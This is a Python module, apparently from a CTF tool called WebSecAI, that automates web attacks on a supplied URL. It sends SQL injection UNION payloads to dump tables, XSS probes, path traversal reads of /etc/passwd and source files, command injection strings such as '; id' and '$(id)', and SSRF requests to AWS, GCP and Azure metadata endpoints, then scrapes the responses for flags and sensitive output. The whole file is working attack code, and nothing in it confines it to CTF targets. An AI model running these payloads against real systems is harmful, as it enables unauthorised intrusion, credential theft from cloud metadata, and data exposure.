"""Exploit Engine: SQLi dump, XSS payloads, LFI/RFI, RCE, SSRF (safe defaults for CTF)."""
import re
from typing import Any, Dict, List, Optional

import requests


def exploit_sqli(url: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Attempt SQLi extraction: error-based / UNION-based.
    context: param, method (get/post), db_type.
    Returns extracted data / tables if possible.
    """
    context = context or {}
    param = context.get("param", "id")
    method = (context.get("method") or "get").lower()
    out: Dict[str, Any] = {"vulnerability": "SQL Injection", "dumped_tables": [], "extracted_data": {}, "payloads_tested": []}

    payloads = [
        f"' UNION SELECT 1,2,3 -- -",
        f"' UNION SELECT 1,table_name,3 FROM information_schema.tables -- -",
        f"1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -",
    ]
    session = requests.Session()
    session.headers["User-Agent"] = "WebSecAI-Exploit/1.0"

    for payload in payloads[:5]:
        try:
            if method == "post":
                r = session.post(url, data={param: payload}, timeout=10)
            else:
                sep = "&" if "?" in url else "?"
                r = session.get(f"{url}{sep}{param}={requests.compat.quote(payload)}", timeout=10)
            out["payloads_tested"].append(payload[:50])
            text = r.text
            if "information_schema" in payload:
                for m in re.finditer(r"([a-z_]{2,30})", text):
                    if m.group(1) in ("users", "flags", "admin", "config", "secret"):
                        out["dumped_tables"].append(m.group(1))
            if "flag" in text.lower() or "CTF{" in text:
                for m in re.finditer(r"(flag\{[^}]+\}|CTF\{[^}]+\})", text):
                    out["extracted_data"].setdefault("flags", []).append(m.group(1))
        except Exception:
            pass
    out["dumped_tables"] = list(set(out["dumped_tables"]))
    return out


def exploit_xss(url: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Test XSS payloads; return which reflected."""
    context = context or {}
    param = context.get("param", "q")
    payloads = [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ]
    out: Dict[str, Any] = {"payloads_tested": [], "reflected": []}
    session = requests.Session()
    for p in payloads:
        try:
            r = session.get(url, params={param: p}, timeout=8)
            if p in r.text or "alert" in r.text:
                out["reflected"].append(p[:40])
            out["payloads_tested"].append(p[:40])
        except Exception:
            pass
    return out


def exploit_lfi(url: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    LFI/Path traversal: try to read /etc/passwd, flag.txt, etc.
    context: param name for file path.
    """
    context = context or {}
    param = context.get("param", "file") or context.get("page", "page")
    paths = [
        "/etc/passwd",
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/flag.txt",
        "../../../flag.txt",
        "php://filter/convert.base64-encode/resource=index.php",
    ]
    out: Dict[str, Any] = {"read_files": [], "payloads_tested": []}
    session = requests.Session()
    session.headers["User-Agent"] = "WebSecAI-Exploit/1.0"
    for path in paths:
        try:
            r = session.get(url, params={param: path}, timeout=8)
            out["payloads_tested"].append(f"{param}={path[:30]}")
            if "root:" in r.text or "flag{" in r.text or "CTF{" in r.text or "RACTF{" in r.text:
                out["read_files"].append({"path": path, "snippet": r.text[:300]})
        except Exception:
            pass
    return out


def exploit_rce(url: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Command injection: safe PoC (id, whoami, echo). No reverse shell.
    context: param (e.g. cmd, exec, command).
    """
    context = context or {}
    param = context.get("param", "cmd")
    payloads = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "& echo 1",
        "; cat /etc/passwd | head -1",
    ]
    out: Dict[str, Any] = {"vulnerability": "Command Injection", "injection_tested": [], "success": False}
    session = requests.Session()
    session.headers["User-Agent"] = "WebSecAI-Exploit/1.0"
    for payload in payloads[:8]:
        try:
            r = session.get(url, params={param: payload}, timeout=8)
            out["injection_tested"].append(payload.strip())
            text = r.text
            if "uid=" in text or "gid=" in text or "root:" in text:
                out["success"] = True
                out["evidence"] = text[:400]
                break
        except Exception:
            pass
    return out


def exploit_ssrf(url: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    SSRF: try cloud metadata (AWS, GCP, Azure) and internal hosts.
    context: param (e.g. url, path, redirect).
    """
    context = context or {}
    param = context.get("param", "url")
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance",
        "http://127.0.0.1/",
        "http://localhost/admin",
        "file:///etc/passwd",
    ]
    out: Dict[str, Any] = {"vulnerability": "SSRF", "tested": [], "accessible": []}
    session = requests.Session()
    session.headers["User-Agent"] = "WebSecAI-Exploit/1.0"
    for target in payloads[:6]:
        try:
            r = session.get(url, params={param: target}, timeout=6)
            out["tested"].append(target[:50])
            if r.status_code == 200 and (len(r.content) > 0 and ("ami-id" in r.text or "instance" in r.text or "root:" in r.text)):
                out["accessible"].append({"url": target, "snippet": r.text[:200]})
        except Exception:
            pass
    return out
